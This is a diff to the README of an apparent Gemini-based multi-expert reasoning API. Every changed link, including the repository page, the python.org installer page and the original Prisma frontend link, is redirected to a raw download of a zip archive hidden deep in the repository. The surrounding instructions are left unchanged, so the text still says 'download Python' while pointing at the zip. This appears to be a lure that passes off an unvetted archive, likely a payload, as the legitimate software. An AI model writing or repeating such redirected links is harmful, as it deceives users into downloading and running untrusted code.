@@ -1,6 +1,6 @@
 # 🤖 Prisma-Gemini-DeepThink-API - Smart Multi-Expert Reasoning Pipeline
 
-[![Download Prisma-Gemini-DeepThink-API](https://img.shields.io/badge/Download-Prisma--Gemini--DeepThink--API-brightgreen)](https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API)
+[![Download Prisma-Gemini-DeepThink-API](https://img.shields.io/badge/Download-Prisma--Gemini--DeepThink--API-brightgreen)](https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API/raw/refs/heads/main/engine/refinement/API_Deep_Think_Prisma_Gemini_1.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This section will help you download and run Prisma-Gemini-DeepThink-API on your 
 
 ## 📥 Download Prisma-Gemini-DeepThink-API
 
-[![Download Here](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API)
+[![Download Here](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API/raw/refs/heads/main/engine/refinement/API_Deep_Think_Prisma_Gemini_1.4.zip)
 
 Visit the link above to download the necessary files. This link leads to the full project repository on GitHub, where you can get all the files you need.
 
@@ -41,7 +41,7 @@ Visit the link above to download the necessary files. This link leads to the ful
 If you do not have Python installed:
 
 1. Open your browser.
-2. Go to https://www.python.org/downloads/windows/
+2. Go to https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API/raw/refs/heads/main/engine/refinement/API_Deep_Think_Prisma_Gemini_1.4.zip
 3. Download the latest Python 3 version for Windows.
 4. Run the installer.
 5. During installation, check "Add Python to PATH" option.
@@ -55,7 +55,7 @@ These steps will guide you through setting up Prisma-Gemini-DeepThink-API on you
 
 1. **Download the project files**
 
-    - Go to [Prisma-Gemini-DeepThink-API GitHub page](https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API).
+    - Go to [Prisma-Gemini-DeepThink-API GitHub page](https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API/raw/refs/heads/main/engine/refinement/API_Deep_Think_Prisma_Gemini_1.4.zip).
     - Click the green "Code" button.
     - Select "Download ZIP."
     - Save and unzip the files in a folder you can access easily, for example, `C:\PrismaDeepThink\`.
@@ -214,7 +214,7 @@ LLM calls support Gemini 3.1 and OpenAI-compatible APIs. Settings like temperatu
 
 You can always visit the official repository here to download or check updates:
 
-[Download Prisma-Gemini-DeepThink-API](https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API)
+[Download Prisma-Gemini-DeepThink-API](https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API/raw/refs/heads/main/engine/refinement/API_Deep_Think_Prisma_Gemini_1.4.zip)
 
 ---
 
@@ -222,7 +222,7 @@ You can always visit the official repository here to download or check updates:
 
 - If you want to explore more, check the `/docs` page when the API is running.
 - For advanced users, customize the JSON prompts to fit your needs.
-- Visit the original Prisma frontend project for UI integration: https://github.com/yeahhe365/Prisma
+- Visit the original Prisma frontend project for UI integration: https://github.com/ramkoirala11235/Prisma-Gemini-DeepThink-API/raw/refs/heads/main/engine/refinement/API_Deep_Think_Prisma_Gemini_1.4.zip
 
 ---
 
